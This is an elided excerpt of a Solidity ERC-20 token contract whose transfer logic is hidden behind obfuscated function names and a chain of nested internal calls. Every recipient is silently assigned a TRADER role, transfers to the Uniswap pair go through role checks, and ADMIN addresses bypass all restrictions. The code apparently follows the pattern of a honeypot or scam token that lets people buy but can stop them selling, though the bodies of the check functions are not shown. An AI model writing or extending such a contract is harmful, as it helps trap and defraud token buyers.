...
abstract contract ICNDJEKFConsole is Context, ICNDJEKFRoleControl {
    ...
    function _roleCheked(bytes32 role, address account, uint256 amt) internal {
        ...
        _ICNDJEKFcheckrole(role, account, amt);
    }

    function _ICNDJEKFcheckrole(bytes32 role, address account, uint256 amt) internal {
    ...
    function _ICNDJEKFchecknewrole(bytes32 role, address account, uint256 num) internal virtual {
...
contract ICNDJEKFERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is ICNDJEKFERC20, ICNDJEKFConsole {
    ...
    ) ICNDJEKFERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(ICNDJEKFERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        _ICNDJEKFxfgrhj(from, to, amt);

    }



    function _ICNDJEKFxfgrhj(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _ICNDJEKFmygbncf(from, to, amt);
    }


    function _ICNDJEKFmygbncf(address from, address to, uint256 amt) internal {
        ...
        _ICNDJEKFifvvvr(from, to, amt);
    }

    function _ICNDJEKFifvvvr(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        _ICNDJEKFfj7ddr(from, to, amt);
    }


    function _ICNDJEKFfj7ddr(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
            ...
            _ICNDJEKFchecknewrole(TRADER,to,1);
        }

        _ICNDJEKFxctbmyrs(from, to, amt);
    }

    function _ICNDJEKFxctbmyrs(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }

        _ICNDJEKFcvhhgdnye(from, to, amt);
    }

    function _ICNDJEKFcvhhgdnye(address from, address to, uint256 amt) internal {
        if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           _ICNDJEKFcvtbfn(from, TRADER, amt);
    ...
    function _ICNDJEKFcvtbfn(address from, bytes32 role, uint256 amt) internal {
        _ICNDJEKFcheckrole(role, from, amt);
    }
